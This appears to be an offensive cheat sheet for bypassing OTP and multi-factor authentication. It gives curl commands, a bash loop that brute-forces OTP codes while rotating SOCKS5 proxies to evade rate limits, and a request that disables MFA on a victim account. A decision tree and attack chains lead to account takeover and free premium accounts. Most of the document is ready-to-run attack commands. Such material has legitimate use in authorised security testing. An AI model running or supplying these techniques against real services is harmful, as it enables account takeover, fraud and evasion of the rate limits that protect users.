# OTP / MFA BYPASS — EXECUTION

| Attack | Signal | Test | Confirm | Kill |
|--------|--------|------|---------|------|
| **Skip OTP Step** | OTP page in signup | `curl -X POST /api/signup -d '{"email":"x@x.com","pass":"X"}'` without OTP param | Account created + can login | "OTP required" error |
| **OTP Reuse** | Same OTP works twice | Login, capture OTP, use it: `curl -X POST /api/verify-otp -d '{"otp":"123456"}'` then again | Both succeed | "OTP expired" or "already used" |
| **OTP Brute** | 4-6 digit OTP | `for i in {000000..999999}; do curl /verify -d "otp=$i" &; done` (use proxy rotation) | One returns 200 with session | Rate limit / lockout after 5 |
| **No MFA on API** | MFA only on login UI | `curl -X POST /api/sensitive-action -b "session=A"` | Action succeeds without MFA | 403 "MFA required" |
| **Backup Codes** | backup_codes in response | `curl -X GET /api/mfa/backup-codes` then reuse same code | Same backup code works multiple times | Codes invalidated after use |
| **MFA Disable** | disable_mfa endpoint | `curl -X POST /api/mfa/disable -d '{"user_id":"VICTIM"}'` | MFA removed from victim account | !current_password check |
| **OTP Predictable** | OTP based on timestamp | Capture 5 OTPs, check pattern: `echo "$OTPS" | sort` | Sequential or time-based pattern | Random OTP |

## CURL COMMANDS
```bash
# OTP brute (4-digit, proxy rotated)
for otp in $(seq -w 0000 9999 | head -500); do
  proxy=$(shuf -n1 proxies.txt)
  curl -s -X POST /api/verify-otp \
    --proxy "socks5://$proxy" \
    -d "phone=%2B1234567890&code=$otp" | grep -v "invalid"
done

# Skip OTP in signup flow
curl -v -X POST /api/register -H "Content-Type: application/json" \
  -d '{"email":"test@test.com","password":"X","skip_otp":true}'

# Test MFA bypass on API paths
for path in /api/orders /api/admin/users /api/payment/methods /api/profile/email; do
  code=$(curl -s -o /dev/null -w "%{http_code}" -X GET "$path" -b "session=A")
  echo "$path → $code"
done

# OTP reuse test
FIRST=$(curl -s -X POST /api/verify -d "session=S1&otp=123456")
SECOND=$(curl -s -X POST /api/verify -d "session=S2&otp=123456")
echo "First: $FIRST | Second: $SECOND"
```

## DECISION TREE
```
Found OTP/MFA flow?
├─ Can skip OTP entirely?
│  ├─ Yes → OTP BYPASS (signup without verification)
│  └─ No → OTP enforced at signup
├─ Can reuse same OTP?
│  ├─ Yes → OTP REUSE (capture once, use indefinitely)
│  └─ No → OTP single-use
├─ OTP brute-forceable?
│  ├─ 4-digit + no rate limit → BRUTE (proxy rotate, 10k attempts)
│  └─ 6-digit + rate limit → PROBABLY NOT (1M attempts, blocked)
├─ MFA enforced on ALL paths?
│  ├─ No → BYPASS via API (login UI has MFA, API doesn't)
│  └─ Yes → MFA consistent
└─ Can disable MFA without current password?
   ├─ Yes → ATO via DISABLE (disable victim's MFA, login)
   └─ No → password re-auth required
```

## CHAIN
OTP Brute + IDOR on email change = ATO (brute OTP, change email, reset password)
OTP Bypass + Premium Abuse = Free premium accounts
